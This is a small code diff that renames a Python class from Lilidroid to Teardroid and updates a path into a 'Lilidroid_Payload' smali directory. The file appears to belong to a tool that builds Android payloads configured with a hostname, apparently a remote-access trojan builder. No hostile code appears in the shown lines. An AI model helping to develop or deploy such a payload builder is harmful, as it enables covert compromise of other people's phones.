@@ -2,10 +2,10 @@ import os
 from colorama import Fore, Style
 
 
-class Lilidroid:
+class Teardroid:
     def __init__(self, name) -> None:
         self.name = name
-        self.AppInfo = os.getcwd() + "/Lilidroid_Payload/smali/com/example/lilidroidv2/AppInfo.smali"
+        self.AppInfo = os.getcwd() + "/Lilidroid_Payload/smali/com/example/teardroidv2/AppInfo.smali"
 
     def build(self, hostname) -> None:
         self.print_result("Building Lilidroid")
